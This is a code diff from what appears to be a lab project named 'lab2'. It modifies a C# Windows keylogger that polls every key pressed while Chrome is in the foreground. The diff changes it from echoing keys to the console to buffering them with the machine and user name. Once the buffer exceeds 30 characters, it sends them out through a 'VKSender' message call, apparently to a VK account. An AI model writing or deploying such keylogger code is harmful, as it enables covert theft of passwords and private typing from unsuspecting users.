@@ -9,18 +9,22 @@ namespace lab2
 {
     class Program
     {
-        [DllImport("user32.dll")] public static extern int GetAsyncKeyState(Int32 i);
-        [DllImport("user32.dll")] static extern IntPtr GetForegroundWindow();
-        [DllImport("user32.dll")] static extern uint GetWindowThreadProcessId(IntPtr hwnd, out int id);
-        [DllImport("user32.dll")] static extern IntPtr GetKeyboardLayout(uint thread);
+        [DllImport("user32.dll")] private static extern int GetAsyncKeyState(Int32 i);
+        [DllImport("user32.dll")] private static extern IntPtr GetForegroundWindow();
+        [DllImport("user32.dll")] private  static extern uint GetWindowThreadProcessId(IntPtr hwnd, out int id);
+        [DllImport("user32.dll")] private  static extern IntPtr GetKeyboardLayout(uint thread);
 
         private const string CHROME = "chrome";
-        
+        private const int BUFFER_LENGTH = 30;
         private static bool _isCaps;
         private static string _keyboardLayout;
+        private static string _pcName;
+        private static string _buffer = string.Empty;
         
         static void Main(string[] args)
         {
+            _pcName = $"{SystemInformation.ComputerName}  : {SystemInformation.UserName}";
+           
             while (true)
             {
                 if(GetActiveWindow() == CHROME)
@@ -34,8 +38,21 @@ namespace lab2
                         {
                             _isCaps = Control.IsKeyLocked(Keys.CapsLock);
                             _keyboardLayout = GetKeyboardLayout();
-                            Console.Write(GetSymbol(i));
+
+                            var c = GetSymbol(i);
+                            _buffer += c;
+                            
                         }
+                    }
+                }
+
+                if (_buffer.Length > BUFFER_LENGTH)
+                {
+                    var message = $"{_pcName}\n {_buffer}";
+
+                    if (VKSender.SendMessage(message))
+                    {
+                        _buffer = string.Empty;    
                     }
                 }
             }
@@ -45,7 +62,7 @@ namespace lab2
         {
             var keyCode = (Keys) i;
 
-            var inputData = string.Empty;
+            string inputData;
             
             switch (keyCode)
             {
